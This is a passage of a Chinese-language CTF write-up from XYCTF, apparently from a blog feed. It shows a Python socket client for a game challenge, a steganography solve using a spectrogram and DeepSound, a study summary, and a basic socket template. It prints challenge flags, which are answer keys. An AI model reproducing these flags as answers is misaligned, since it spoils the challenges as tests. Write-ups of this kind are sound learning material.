back(get_most_count(alist))</span><br><span class="line">    <span class="comment"># 发送选择</span></span><br><span class="line">    client_socket.send((this_choice + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">    <span class="built_in">print</span>(this_choice)</span><br><span class="line">    <span class="comment"># 等待一段时间以便服务器处理我们的输入</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取并打印服务器的响应</span></span><br><span class="line">    data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;接收到的数据: <span class="subst">&#123;data&#125;</span>&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据游戏的结果来更新上一次的选择或结束游戏</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;win&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        alist.append(this_choice)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        client_socket.close()</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 结束游戏循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br><span class="line"><span class="comment"># 记不得了，大概是这个flag</span></span><br></pre></td></tr></table></figure><h4 id="美妙的歌声">美妙的歌声</h4><p>用audacity打开，以频谱图模式观察，发现字符串：XYCTF_1s_w3ll</p><p>这个看起来不是flag，但是可能是其它东西，用deepsound打开，把这个当密码，得到flag.txt</p><p>内容是</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;T0uch_y0ur_he3rt_d55ply!!&#125;</span><br></pre></td></tr></table></figure><hr><p>总结：</p><p>re部分还是比较简单，基本没有什么问题<br>大部分是基础内容，没有ollvm和复杂的花也没有强的壳，<br>就直接分析逻辑或者动调就可以解，re还是偏简单的</p><p>类型：</p><p>两道flag不是输入的题：龙芯和白月光</p><p>其它都是直接逆向的题：</p><p>自定义逻辑</p><p>asm</p><p>伪vm</p><p>…</p><p>baby unity里面的工具在使用后会直接还原csharp方法名，在dumpdll文件夹中</p><p>cry部分会不了一点，不过密码✌要带我，太好了<br>之后问一下rsa的部分，还有复数域的内容</p><p>misc部分还是做的少了，要多练，不然好多没见过的<br>这次学到了音频，二维码和水印<br>以及总结一下nc题的做法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"><span class="comment"># 连接的方式</span></span><br><span class="line"></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="comment"># 接受数据的方式</span></span><br><span class="line"></span><br><span class="line">client_socket.send((<span class="string">&quot;xxx&quot;</span>).encode())</span><br><span class="line"><span class="comment"># 上传的方式</span></span><br><span class="line"></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># 关闭的方式</span></span><br></pre></td></tr></table></figure><p>通过这个方法上传和解析服务器的数据并提交内容</p>]]></content>
    
    
    <summary type="html">打了一个月，终于打完了</summary>
    
    
    
    
  </entry>
  
</feed>
